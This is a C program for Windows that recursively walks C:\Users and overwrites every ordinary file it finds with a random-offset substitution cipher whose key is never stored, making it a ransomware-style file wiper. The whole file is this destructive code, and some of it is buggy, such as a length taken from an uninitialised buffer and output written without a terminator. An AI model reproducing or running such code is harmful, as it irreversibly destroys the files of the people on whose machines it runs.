#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

char *writeToFile(char *final, const char *filename) {
    // write-mode overwrites all contents of a file 
    FILE *file = fopen(filename, "w");

    if (file == NULL) {
        printf("Could not open the file for writing.\n");
        return NULL;  
    }

    char *newContent = final;

    // Writes the new content to the file
    fprintf(file, "%s", newContent);  // You can use fputs(file, newContent);

    fclose(file);

    return newContent;
}

char *readfile(const char *filename) {
    FILE *file = fopen(filename, "r");  // Open the file for reading

    if (file == NULL) {  // Checks if the file was opened if not it exits
        printf("Could not read the file.\n");
        return NULL;  
    }

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    rewind(file);

    char *content = (char *)malloc((filesize + 1) * sizeof(char));
    if (content == NULL){
        fclose(file);
        return NULL;
    }

    fread(content, sizeof(char), filesize, file);
    content[filesize] = '\0';


    fclose(file);  
    return content;
}

int cipher(char full_path[MAX_PATH]){
    char *filename = full_path;
    char *content = readfile(filename);
    int contentLength = strlen(content);
    srand(time(NULL));
    int direction = abs(rand() * 1000);

    char customAlphabet[250] = "]abYktj!WVq8F+P9^C*Z2[}X3e=|Ñrº,.ie/2mH0&QáóvUu@h0d<>¡PIESzéÚs♦Áº:¬(3^9ÑfTtºlxyP}gk5w~Q¡é}@W";
    int customAlphabetLength = strlen(customAlphabet);

    char final[contentLength];
    int length = strlen(final);



    for (int i = 0; i < contentLength; i++){
        int found = 0;
        int charPosition = -1;

        for (int j = 0; j < customAlphabetLength; j++){
            if (content[i] == customAlphabet[j]){
                found = 1;
                charPosition = j;
                break;
            }   

        }
        if (found == 1){
            int iOffset = (charPosition + direction) % customAlphabetLength;
            final[length] = customAlphabet[iOffset];
        }
        else{
            if (length % 2 == 0){
                final[length] = '.';
            }
            else{
                final[length] = '#';
            }
        }
        length++;
    }
    if (content != NULL){
        printf("Success");
        writeToFile(final, filename);
        free(content);
    }
    return 0;
}

void check_file(const char *path, const char *file_name) {
    // Create the full path to the file
    char full_path[MAX_PATH]; // MAX_PATH = 260
    snprintf(full_path, sizeof(full_path), "%s\\%s", path, file_name);

    // the strrchr command goes to the last period in the filename, and everything after including the last period is recorded into the ext variable 
//    const char *ext = strrchr(file_name, '.');

    DWORD attributes = GetFileAttributes(full_path);

    if (attributes == INVALID_FILE_ATTRIBUTES){
        printf("Invalid file attributes\n");
        return;
    }

    if (attributes & FILE_ATTRIBUTE_SYSTEM || attributes & FILE_ATTRIBUTE_DIRECTORY || attributes & FILE_ATTRIBUTE_DEVICE || attributes & FILE_ATTRIBUTE_REPARSE_POINT || attributes & FILE_ATTRIBUTE_OFFLINE || attributes & FILE_ATTRIBUTE_NOT_CONTENT_INDEXED || attributes & FILE_ATTRIBUTE_INTEGRITY_STREAM || attributes & FILE_ATTRIBUTE_VIRTUAL || attributes & FILE_ATTRIBUTE_NO_SCRUB_DATA || attributes & FILE_ATTRIBUTE_PINNED || attributes & FILE_ATTRIBUTE_UNPINNED || attributes & FILE_ATTRIBUTE_RECALL_ON_OPEN || attributes & FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS || attributes & FILE_ATTRIBUTE_NOT_CONTENT_INDEXED ){
        printf("%s is an important file\n", full_path);
        return;
        //DO NOT ATTEMPT TO WRITE TO IT 
    } else {
        cipher(full_path);
    }


//    if (attributes & FILE_ATTRIBUTE_HIDDEN){
//        printf("%s is HIDDEN\n", full_path);
//    }
//
//
//    if (attributes & FILE_ATTRIBUTE_ARCHIVE){
//        printf("%s is a ARCHIVE file\n", full_path);
//    }
//    
//    if (attributes & FILE_ATTRIBUTE_NORMAL){
//        printf("%s is a NORMAL file\n", full_path);
//    }
//
//    if (attributes & FILE_ATTRIBUTE_TEMPORARY){
//        printf("%s is a TEMPORARY file\n", full_path);
//    }
//
//    if (attributes & FILE_ATTRIBUTE_SPARSE_FILE){
//        printf("%s is a SPARSE_FILE file\n", full_path);
//    }
//
//    if (attributes & FILE_ATTRIBUTE_COMPRESSED){
//        printf("%s is a COMPRESSED file\n", full_path);
//    }
//
//    if (attributes & FILE_ATTRIBUTE_ENCRYPTED){
//        printf("%s is a ENCRYPTED file\n", full_path);
//    }
//
//    if (attributes & FILE_ATTRIBUTE_EA){
//        printf("%s is a EA file\n", full_path);
//    }
//
//
//    if (attributes & FILE_ATTRIBUTE_READONLY){
//        printf("Making %s writeable\n", full_path);
//
//        attributes &= ~FILE_ATTRIBUTE_READONLY;
//        if (SetFileAttributes(full_path, attributes)){
//            printf("%s is now writable\n", full_path);
//        }else{
//            printf("Error chaning file attributes on %s\n", full_path);
//            return;
//        }
//    }else {
//        printf("File is already not read-only");
//    }


    
//    if (ext != NULL) {
//        if (strcmp(ext, ".md") == 0) {
//            printf("%s is a .md file\n", full_path);
//        } else if (strcmp(ext, ".txt") == 0) {
//            printf("%s is a .txt file\n", full_path);
//        }
//        // Add more conditions for other file extensions if needed
//    } else {
//        // If no extension is found, handle the case
//        printf("%s is a file with no extension\n", full_path);
//    }
}


void search_directory(const char *path) {
    WIN32_FIND_DATA find_file_data;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", path);

    hFind = FindFirstFile(search_path, &find_file_data); // start to search 

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error opening path: %s\n", path);
    }

    // Store directories to process later
    char directories[MAX_PATH][MAX_PATH];
    int dir_count = 0;

    // Loop through the directory contents
    do {
        const char *file_name = find_file_data.cFileName;

        // Skips the "." and ".." entries
        if (strcmp(file_name, ".") != 0 && strcmp(file_name, "..") != 0) {
            if (!(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                check_file(path, file_name); // if it's a file, check it
            } else {
                // If it's a directory, store it to process later
                char new_path[MAX_PATH];
                snprintf(new_path, sizeof(new_path), "%s\\%s", path, file_name);
                snprintf(directories[dir_count], sizeof(directories[dir_count]), "%s", new_path);
                dir_count++;
            }
        }
    } while (FindNextFile(hFind, &find_file_data) != 0);

    // Close the search handle
    FindClose(hFind);

    // Process directories after all files are processed
    for (int i = 0; i < dir_count; i++) {
        printf("%s is a directory\n", directories[i]);
        search_directory(directories[i]);  // Recurse into subdirectories
    }
}

int main() {
    // Start searching from a directory (e.g., "C:\\Users")
    // Not sure of doing C: will work 
    const char *start_path = "C:\\Users";
    search_directory(start_path);
    printf("Program Executed With No Issues");
    return 0;
}
